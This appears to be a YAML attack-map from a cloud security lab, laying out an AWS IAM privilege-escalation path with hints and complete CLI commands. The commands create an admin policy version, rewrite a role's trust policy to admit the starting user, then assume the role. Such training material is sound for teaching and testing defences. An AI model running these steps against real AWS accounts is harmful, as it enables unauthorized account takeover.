attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-iam-020-to-admin-starting-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:CreatePolicyVersion on the target customer-managed policy
        and iam:UpdateAssumeRolePolicy on the target role, but cannot initially assume
        that role.

    - id: target-policy
      label: "Target Policy"
      type: resource
      subType: iam-policy
      arn: "arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy"
      description: >
        This is a customer-managed IAM policy attached to the target role. It initially
        grants minimal permissions, but because you have iam:CreatePolicyVersion on this
        policy, you can create a new version that grants full administrative access (*:* on *).
        AWS allows up to 5 policy versions and will automatically set the newest version
        as the default when you pass --set-as-default.

    - id: target-role
      label: "Target Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-iam-020-to-admin-target-role"
      description: >
        This IAM role has the target customer-managed policy attached. After you modify
        that policy to grant admin permissions and update the role's trust policy to allow
        the starting user, you can assume this role and obtain full administrative access
        to the AWS account. Notably, no explicit sts:AssumeRole permission is required
        in your own policy when you are named directly in a role's trust policy.

  edges:
    - from: starting-principal
      to: target-policy
      label: "iam:CreatePolicyVersion"
      description: >
        Create a new version of the target customer-managed policy that grants full
        administrative permissions (*:* on *), replacing its original limited permissions.
      hints:
        - "Start by understanding what policies this principal can modify. Check the policy attached to the starting user to find which IAM policies it has iam:CreatePolicyVersion on."
        - "Use iam:GetPolicy to inspect the target customer-managed policy -- look at its current default version ID and what role has it attached."
        - "Use iam:GetPolicyVersion to read the current policy document. You'll see it has minimal permissions today."
        - "Customer-managed policies support up to 5 versions. You can create a new version and set it as the default -- effectively replacing the policy's permissions instantly."
        - "When you create a new policy version with --set-as-default, any role that already has this policy attached immediately inherits the new permissions."
        - "Browse to https://pathfinding.cloud/paths/iam-020 for full technique details on this escalation path."
      commands:
        - description: "Inspect the current policy metadata and default version"
          command: |
            aws iam get-policy \
              --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy \
              --query 'Policy.[PolicyName,DefaultVersionId,AttachmentCount]' \
              --output table
        - description: "View the current (minimal) policy document"
          command: |
            aws iam get-policy-version \
              --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy \
              --version-id v1 \
              --query 'PolicyVersion.Document' \
              --output json
        - description: "Create a new policy version with admin permissions and set it as default"
          command: |
            aws iam create-policy-version \
              --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy \
              --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
              --set-as-default

    - from: starting-principal
      to: target-role
      label: "iam:UpdateAssumeRolePolicy + sts:AssumeRole"
      description: >
        Update the target role's trust policy to add the starting user as a trusted
        principal, then assume the now-privileged role to gain administrative access.
      hints:
        - "Even though the target role now has admin permissions, you still cannot assume it -- the role's trust policy does not list your user as a trusted principal."
        - "Use iam:GetRole to read the current trust policy of the target role. You will see it only trusts ec2.amazonaws.com, not your user."
        - "You have iam:UpdateAssumeRolePolicy on the target role. This lets you replace the entire trust policy document with a new one."
        - "Write a trust policy that preserves any existing trusted principals and adds your user's ARN as an additional trusted principal."
        - "Once your user is named directly in the trust policy, AWS lets you call sts:AssumeRole without any explicit sts:AssumeRole permission in your own policy."
        - "Wait about 15 seconds after updating the trust policy before attempting to assume the role -- IAM changes take a moment to propagate."
        - "Browse to https://pathfinding.cloud/paths/iam-020 for full technique details on this escalation path."
      commands:
        - description: "View the current role trust policy"
          command: |
            aws iam get-role \
              --role-name pl-prod-iam-020-to-admin-target-role \
              --query 'Role.AssumeRolePolicyDocument' \
              --output json
        - description: "Update the role trust policy to allow the starting user"
          command: |
            aws iam update-assume-role-policy \
              --role-name pl-prod-iam-020-to-admin-target-role \
              --policy-document '{
                "Version": "2012-10-17",
                "Statement": [
                  {
                    "Effect": "Allow",
                    "Principal": {"Service": "ec2.amazonaws.com"},
                    "Action": "sts:AssumeRole"
                  },
                  {
                    "Effect": "Allow",
                    "Principal": {"AWS": "arn:aws:iam::{account_id}:user/pl-prod-iam-020-to-admin-starting-user"},
                    "Action": "sts:AssumeRole"
                  }
                ]
              }'
        - description: "Assume the target role to gain admin access"
          command: |
            aws sts assume-role \
              --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-020-to-admin-target-role \
              --role-session-name privesc-session
        - description: "Verify administrative access"
          command: "aws iam list-users --max-items 3"
